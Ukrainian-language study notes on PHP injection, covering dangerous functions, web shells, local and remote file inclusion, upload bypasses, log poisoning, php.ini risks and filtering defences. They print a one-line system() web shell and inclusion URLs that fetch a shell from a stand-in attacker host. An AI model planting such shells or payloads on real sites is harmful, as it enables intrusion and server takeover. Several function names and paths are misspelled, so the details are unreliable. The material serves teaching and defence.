#PHP-injection

PHP-injection - ...

RCE - remote code execution - є максимальною загрозою классу А1 по OWASP (2013)

PHP-injection є можливою коли користувацькі дані приймаються як є і приймаються без перевірки

Основою до PHP-injection є те, що функції ПХП є потенційно небезпечними (деякі алгоритми мають здатність працювати по-іншому, якщо відправляти не валідовані дані)

До таких потенційно-небезпечних функцій відносяться:
- include / indlude.once - include включає і виконує файл або видає повідомлення E_WARNING (ящко не знайдений); include.once виконує файл лише раз
- require / require.once - require якщо не знаходить, то видає фатал_еррор
- eval - приймає строку і інтерпретує її як PHP-код

	<? 
	eval($_GET['code']);
	?>

або

	http://site.com/page.php?code=phpinfo();

- preg_replace - замінює підстроку по заданому регулярному виразу в строці (використовується для фільтрації небезпечних символів)
- passthrow / system - виконують зовнішню программу; passthrow - виводить raw-output;   system - виводить output

include використовується як підключення бібліотек або частин сторінки (динамічна заміна футера, хедера, контенту сторінки)

## WEB-SHELL

	shell.php

	<?php system($_GET['cmd']);?>

	http://site.com/page.php?cmd=shutdown%20-s

## Классифікація PHP-injection
Види:
1. Локальна PHP-injection - в якості підключенного кода через веб-шелл є код з того самого серверу
2. Глобальна PHP-injection - в якості підключенного кода через веб-шелл є код з іншого серверу

Наприклад:
	
	<?php
		if($_GET['id'])
			include($_GET('id'));
	?>

	http://site.com/main.php?id=1.php

	http://site.com/main.php?id=http://hacker.net/shell.php&cmd=dir

	http://site.com/main.php?id=http://hacker.net/shell.php&cmd=ls

[шлях до файлу] - локальна PHP-injection

1. uploadfiles - перевірка файлів при завантаженні на сайт. Якщо сайт може відображати зображення, то замість зображення можна завантажити файл веб-шеллу, замаскувавши його під зображення (шелл мав розширення .php, змінюємо на .gif і завантажуємо).

При завантаженні треба перевіряти файл на відповідність mine-types або зчитувати інформацію про файл або змінити файл (змінити розміри файлу).

Способи обходу, пов'язані з тим, що використовуються символи обмеження пхп коду. Можна взяти графічний файд і в кінці дописати "<? ?>"

2. Проблема т.з. "ядовитого нуля" - "%00" - відсікає кінець строки, особливо це стосується файлу з паролями 

	/etc/passwords.txt

3. Ін'єкція через логи Apache - ... кожен користувач може змінювати ці файли. Наприклад функція авторизації логується і 

	apache.logs.txt
	user 'admin' ; access denied ;

Можна в поле логіна ввести пхп код і цей код впишеться в лог файлу

## Чим тестувати

Є декілька інструментів для тестування на пхп-вразливості:
1. Acunetix - сканер
2. RATS - Remote Auditing Tools for Security
3. RPVS - Remote PHP Vulnerability Scanner

## Вразливості, пов'язані з файлом php.ini

В цьому файлі знаходиться декілька директив, які суттєво впливають на небезпеку додатка:
- Register_globals=on - суть полагає в тому, що всі параметри, які передані через запити гет і пост автоматично стають глобальними змінними. Ніщо не заважає потім перевірити змінну. Атака можлива, коли регістер_глобалс включена.
	1. url -> http://site.com/index.php?page=25
	2. Тоді існує $_GET['page']
	3. І існує змінна $page, яка є в массиві $GLOBALS['page']
- allow_url_include=on - дозволяє підключення файлу через url (глобальні ін'єкції)
- Fopen - (include, include.once, require, require.once)

## Способи захисту

###1. Фільтрація параметрів

приклад вразливого скрипта:

	<?php
		$page=$_GET['page'];
		include($page.'.php');
	?>

як захищатись:
1. перевірка змінної $page на недопустимі символи

	<?
		$module = $_GET['module'];
		if(strpbrk($module,'?/:')) die('blocked')
		include($module)
	?>

2. перевірка змінної $page - реалізація white-list

	<?
		if(isset($_GET['page']))
			switch($_GET['page']) {
				case 'news':
					require_once('news.php');
					break;
				default:
					require_once('index.php');
					break;
			}
		require_once('index.php');
	?>